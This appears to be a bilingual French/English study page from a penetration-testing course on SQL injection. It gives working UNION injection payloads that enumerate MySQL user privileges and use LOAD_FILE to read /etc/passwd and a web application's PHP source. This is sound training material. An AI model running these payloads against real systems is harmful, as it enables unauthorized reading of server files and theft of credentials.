# Reading Files

***

### <mark style="color:red;">Privileges</mark>

* **Lire des données** est beaucoup plus courant que **écrire**, cette dernière action étant réservée aux utilisateurs privilégiés.
* Exemple : sur MySQL, il faut le **privilège FILE** pour charger un fichier dans une table et lire des fichiers.
* On commence donc par **vérifier les privilèges de l’utilisateur** pour décider si l’on peut lire et/ou écrire des fichiers sur le serveur.

<mark style="color:green;">**DB User**</mark>

* Il faut d’abord savoir **quel utilisateur nous sommes** dans la base.
* Lire des données ne nécessite pas forcément les droits DBA, mais dans les DBMS modernes, **seuls les DBA ont souvent ces privilèges**.
* Si nous avons les droits DBA, il est probable d’avoir aussi le **privilège de lecture de fichiers**.
* Sinon, il faut **vérifier nos privilèges** pour savoir ce qu’on peut faire.
* Pour connaître l’utilisateur actuel, on peut utiliser plusieurs requêtes.

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

Our `UNION` injection payload will be as follows:

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

or:

```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

Which tells us our current user, which in this case is `root`:

<figure><img src="https://academy.hackthebox.com/storage/modules/33/db_user.jpg" alt=""><figcaption></figcaption></figure>

This is very promising, as a root user is likely to be a DBA, which gives us many privileges.

<mark style="color:green;">**User Privileges**</mark>

Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:

```sql
SELECT super_priv FROM mysql.user
```

Once again, we can use the following payload with the above query:

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

If we had many users within the DBMS, we can add `WHERE user="root"` to only show privileges for our current user `root`:

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

<figure><img src="https://academy.hackthebox.com/storage/modules/33/root_privs.jpg" alt=""><figcaption></figcaption></figure>

The query returns `Y`, which means `YES`, indicating superuser privileges. We can also dump other privileges we have directly from the schema, with the following query

{% code fullWidth="true" %}
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```
{% endcode %}

From here, we can add `WHERE grantee="'root'@'localhost'"` to only show our current user `root` privileges. Our payload would be:

{% code overflow="wrap" fullWidth="true" %}
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
{% endcode %}

And we see all of the possible privileges given to our current user:

<figure><img src="https://academy.hackthebox.com/storage/modules/33/root_privs_2.jpg" alt=""><figcaption></figcaption></figure>

We see that the `FILE` privilege is listed for our user, enabling us to read files and potentially even write files. Thus, we can proceed with attempting to read files.

***

### <mark style="color:red;">LOAD\_FILE</mark>

* Si l’on a **suffisamment de privilèges**, on peut lire des fichiers locaux avec **`LOAD_FILE()`**.
* Cette fonction MySQL/MariaDB prend **un seul argument** : le nom du fichier.
* Exemple : lire `/etc/passwd` avec `LOAD_FILE('/etc/passwd')`.

```sql
SELECT LOAD_FILE('/etc/passwd');
```

Note: We will only be able to read the file if the OS user running MySQL has enough privileges to read it.

Similar to how we have been using a `UNION` injection, we can use the above query:

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

<figure><img src="https://academy.hackthebox.com/storage/modules/33/load_file_sqli.png" alt=""><figcaption></figcaption></figure>

***

### <mark style="color:red;">Another Example</mark>

We know that the current page is `search.php`. The default Apache webroot is `/var/www/html`. Let us try reading the source code of the file at `/var/www/html/search.php`

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

<figure><img src="https://academy.hackthebox.com/storage/modules/33/load_file_search.png" alt=""><figcaption></figcaption></figure>

However, the page ends up rendering the HTML code within the browser. The HTML source can be viewed by hitting `[Ctrl + U]`.

![load\_file\_source](https://academy.hackthebox.com/storage/modules/33/load_file_source.png)

The source code shows us the entire PHP code, which could be inspected further to find sensitive information like database connection credentials or find more vulnerabilities.
